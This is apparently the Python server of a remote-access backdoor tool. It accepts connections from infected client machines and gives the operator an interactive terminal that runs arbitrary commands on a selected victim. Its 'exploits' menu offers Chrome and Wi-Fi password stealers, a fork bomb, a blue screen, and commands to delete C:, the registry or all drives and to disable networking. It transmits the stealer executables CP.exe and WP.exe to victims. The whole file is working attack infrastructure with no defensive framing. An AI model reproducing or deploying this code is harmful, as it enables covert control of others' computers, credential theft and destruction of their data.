import socket,threading
from queue import Queue
import rx7 as rx
from rx7 import style
import pyautogui



NUMBER_OF_TREADS= 2
JOB_NUMBER= [1,2]
queue= Queue()
all_connections= []
all_addresses= []


# Create Socket (Socket: Allows 2 computers to connect with each other)
def socket_create():
    try:
        style.print('[*] Creating Socket...','blue')
        global s
        global host
        global port
        host= rx.system.ip_local()
        host='192.168.1.8'
        port= 9999
        s= socket.socket()
        style.print('[+] Socket has been created successfully on ','green',end='')
        style.print(f'{host}','green',style='bold')
        
    except socket.error as err:
        style.print(f'[-] An error occured in creating socket: {err}','red')

# Bind socket to port and wait for connection from client
def socket_bind():
    try:
        style.print(f'[*] Binding socket to port ','blue',end='')
        style.print(str(port),'blue',style='bold')
        try:
            s.bind((host,port))
            s.listen(5)
        except OSError:
            style.print('[-] Port is already in use.','red')
            style.print('[*] Port will be able to use in 1 minute','blue')
        #s.listen(5)
        else:
            style.print(f'[+] Done','green')
            style.print('[+] Server is running on ','green',end='')
            style.print(f'{host}:{port}','green',style='bold')
        print()
    except socket.error as err:
        style.print(f'[-] An error uccored in binding socket: {err}','red')
        style.print('[*] Retrying...','blue')
        socket_bind()


# Accept connections from multiple clients and save to list
def accept_connections():
    for c in all_connections:  c.close()
    del all_connections[:]
    del all_addresses[:]

    while True:
        try:
            conn, address= s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            style.print(f'\n[+] Conection Has Been Established  {all_addresses[-1][0]}','green')
            #style.print('\nPRC','yellow',end='');print('> ',end='')
        except:
            pass#style.print('[-] Error in Accepting Connection','red')



# Interactive prompt for sending commands remotely
def start_terminal():
    #print()
    global s
    while True:
        style.print('PRC','yellow',end='')
        cmd= input('> ')
        if not cmd:                           #< If nothing is typed, start loop again >#
            continue        
        elif 'rebind' in cmd.lower():             #< When port is already in use, rebind try again to reach it. >#
            
            try: cmd[7];NPort= int(cmd[7:])
            except IndexError: NPort= int(port)
            pass
            try:
                s.bind((host,NPort))
                s.listen(5)
            except OSError:
                style.print('[-] Port is still in use  or  We are connected to a port','red')
            else:
                style.print(f'[+] Done','green')
                style.print('[+] Server is running on ','green',end='')
                style.print(f'{host}:{NPort}\n','green',style='bold')
        elif cmd.lower() == 'list':             #< Display List of Devices Connect to the Server >#
            list_connections()
        elif 'select' in cmd:                   #< Connect to a Device With It's Index:  (e.g: select 0) >#
            conn= get_target(cmd)
            if conn is not None:
                cwd= str(conn.recv(20480),'utf-8')
                print(cwd,end='')                
                send_target_commands(conn,all_addresses[all_connections.index(conn)])
        elif cmd in ('cls','clear'):            #< Clear the Screen >#
            rx.cls()
        elif 'close' in cmd:                    #< Close With Index Number:  (e.g: close 1) >#
            try:
                ToRemove= all_addresses[int(cmd[6:])]
                all_connections[int(cmd[6:])].close()
                style.print(f'[+]', 'green')
                style.print(str(ToRemove[0]),'green',style='bold')
                style.print(' Connection Has Been Successfully Closed','green')
            except:
                style.print('[-] No Connection Found','red')       
            '''elif cmd == 'restart':               #< To Restart The Server (NOT WORKING) >#
            s.close()
            s= socket.socket()
            s.bind((host,port))
            s.listen(5)'''
        elif cmd.lower() == 'exploits':         #< Show Exploits >#
            style.print('NAME                          :    COMMAND  ',style='bold')
            style.print('Chrome Password Stealer       :    CP       ','green')
            style.print('WIFI Password Stealer         :    WP       ','green')
            style.print('Blue Death Screen             :    BDS      ','blue')
            style.print('Account Bomber                :    AccBomb  ','blue')
            style.print('Fork Bomb                     :    ForkBomb ','blue')
            style.print('Delete C                      :    DelC     ','red')
            style.print('Delete Registery File         :    DelReg   ','red')
            style.print('Delete Temp Directory         :    DelTmp   ','red')
            style.print('Disable Internet Permanently  :    DisNet   ','red')
            style.print('Delete All Drives             :    DelDrv   ','red')



        else:                                   #< When command is not in above commands >#
            style.print('Command does not exist','red')   


# Displays all current connections
def list_connections():
    results= ''
    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += f"{i}     {all_addresses[i][0]}    {all_addresses[i][1]}\n"
    style.print('------  Clients   -------','blue',style='bold')
    style.print('ID        IP         PORT',style='bold')
    style.print(results,'green')


# Select a target client
def get_target(cmd):
    try:
        target= int(cmd[7:])
        conn = all_connections[target]
        rx.cls()
        style.print(f'[+] Connected to {all_addresses[target][0]}','green',style='bold')
        #style.print(str(all_addresses[target][0]),'yellow',end='')
        #print('> ',end='')
        
        return conn
    except:
        style.print('Not a valid selection','red')
        return None


# Connect with remote target client
def send_target_commands(conn,address):
    #cwd= str(conn.recv(20480),'utf-8')
    #print(cwd,end='')
    while 1:
        try:
            cmd= input()
            if not cmd:                         #< If nothing is typed, start loop again >#
                continue
            elif cmd.lower() == 'exploits':     #< Show Exploits >#
                style.print('NAME                          :    COMMAND  ',style='bold')
                style.print('Chrome Password Stealer       :    CP       ','green')
                style.print('WIFI Password Stealer         :    WP       ','green')
                style.print('Blue Death Screen             :    BDS      ','blue')
                style.print('Account Bomber                :    AccBomb  ','blue')
                style.print('Fork Bomb                     :    ForkBomb ','blue')
                style.print('Delete C                      :    DelC     ','red')
                style.print('Delete Registery File         :    DelReg   ','red')
                style.print('Delete Temp Directory         :    DelTmp   ','red')
                style.print('Disable Internet Permanently  :    DisNet   ','red')
                style.print('Delete All Drives             :    DelDrv   ','red')
            elif cmd.lower().startswith('send'):
                if   cmd[5:] =='CP':               #< Send CP Exploit to Client >#
                    conn.send(b'CP EXPLOIT')
                    import os,tqdm
                    BUFFER_SIZE= 4096
                    SEPARATOR = "<SEPARATOR>"
                    filename= 'CP.exe'
                    filesize = os.path.getsize(filename)
                    #conn.send(f"{filename}{SEPARATOR}{filesize}".encode())
                    progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024,)
                    with open(filename, "rb") as f:
                        for _ in progress:
                            bytes_read = f.read(BUFFER_SIZE)
                            if not bytes_read:
                                break
                            conn.send(bytes_read)
                            progress.update(len(bytes_read))
                    style.print('[+] Done','green')
                    style.print('[+] CP Exploit Starts running on','green') 
                    style.print(str(address[0]),'green',style='bold')
                    style.print('[*] Port will be able to use in 1 minute','blue')
                    conn.close()
                    rx.wait(1)
                    pyautogui.hotkey('ctrl','c')
                elif cmd[5:] =='WP':               #< Send WP Exploit to Client >#
                    conn.send(b'WP EXPLOIT')
                    import os,tqdm
                    BUFFER_SIZE= 4096
                    SEPARATOR = "<SEPARATOR>"
                    filename= 'WP.exe'
                    filesize = os.path.getsize(filename)
                    #conn.send(f"{filename}{SEPARATOR}{filesize}".encode())
                    progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024,)
                    with open(filename, "rb") as f:
                        for _ in progress:
                            bytes_read = f.read(BUFFER_SIZE)
                            if not bytes_read:
                                break
                            conn.send(bytes_read)
                            progress.update(len(bytes_read))
                    style.print('[+] Done','green')
                    style.print('[+] WP Exploit Starts running on','green') 
                    style.print(str(address[0]),'green',style='bold')
                    style.print('[*] Port will be able to use in 1 minute','blue')
                    conn.close()
                    rx.wait(1)
                    pyautogui.hotkey('ctrl','c')
                else:
                    conn.send(f'{cmd[5:].upper()} EXPLOIT')
            elif cmd=='quit':                   #< Return to the main Program >#
                break
            elif len(str.encode(cmd)) > 0:      #< Send Command to Client ># 
                conn.send(str.encode(cmd))
                client_response= str(conn.recv(20480),'utf-8')
                for line in client_response.splitlines()[:-1]: print(line)
                print()
                print(client_response.splitlines()[-1],end='')

        except:
            #raise
            style.print('[-] Connection was lost','red',style='bold')
            break


# Creating Threads
def create_workers():
    for _ in range(NUMBER_OF_TREADS):
        t= threading.Thread(target=work)
        t.daemon= True
        t.start()


# Do the next job in the queue (one handle connections, one sends commands)
def work():
    while True:
        x= queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            start_terminal()
        queue.task_done()


# Each item is a new job
def create_job():
    for x in JOB_NUMBER:
        queue.put(x)
        rx.wait(0.25)
    try:
        queue.join()
    except KeyboardInterrupt:
        style.print('EXIT','red')

rx.cls()
create_workers()
create_job()